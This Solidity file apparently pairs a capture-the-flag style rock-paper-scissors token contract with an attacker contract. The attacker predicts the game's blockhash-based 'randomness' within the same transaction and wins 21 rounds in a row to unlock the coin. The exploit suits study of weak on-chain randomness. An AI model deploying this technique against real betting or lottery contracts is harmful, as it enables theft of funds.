pragma solidity ^0.4.18;


/**
 * @title ERC20Basic
 * @dev Simpler version of ERC20 interface
 * @dev see https://github.com/ethereum/EIPs/issues/179
 */
contract ERC20Basic {
  function totalSupply() public view returns (uint256);
  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}

contract RPSCoin is ERC20Basic {
  uint256 wins = 0;
  address owner;
  
  function RPSCoin() public {
    owner = msg.sender;
  }

  function totalSupply() public view returns (uint256) {
    return wins;
  }

  function transfer(address _to, uint256 _value) public returns (bool) {
    uint8 yourMove = uint8(_value % 3);
    uint8 myMove = uint8(random(wins + uint256(_to))) % 3;
    if(wins >= 20){
      myMove = uint8(_value + 1) % 3;
    }
    if(yourMove == myMove){
      return true;
    }else if((yourMove + 1) % 3 == myMove){
      wins = 0;
      return true;
    }else{
      wins += 1;
    }
  }

  function balanceOf(address _owner) public view returns (uint256 balance) {
    if (owner == _owner && wins >= 21) {
      return 1;
    }
    return 0;
  }
  
  function random(uint256 _nonce) public view returns (uint256){
    return uint256(keccak256(_nonce, block.blockhash(block.number-1)));
  }
  
}

contract RPSCoinAttacker {
    address nonce;
    function RPSCoinAttacker() public{
        nonce = 0xca35b7d915458ef540ade6068dfe2f44e8fa733c;
    }
    function attack(address _target) public returns (bool){
        RPSCoin r = RPSCoin(_target);
        uint256 wins = r.totalSupply();
        uint8 myMove = uint8(random(wins + uint256(nonce))) % 3;
        if(wins >= 20){
            return r.transfer(nonce, 511);
        }
        for(uint8 i=0; i<=3; i++){
            uint256 newMove = i + myMove;
            if(newMove == myMove){
            }else if((newMove + 1) % 3 == myMove){
                wins = 0;
            }else{
                return r.transfer(nonce, newMove);
            }
            
        }
    }
    function auto21(address _target) public {
      for(uint8 i=0; i<=21; i++){
        attack(_target);
      }
    }
    function random(uint256 _nonce) public view returns (uint256){
        return uint256(keccak256(_nonce, block.blockhash(block.number-1)));
    }
}

//Call RPSCoinAttacker.attack("Contract Address")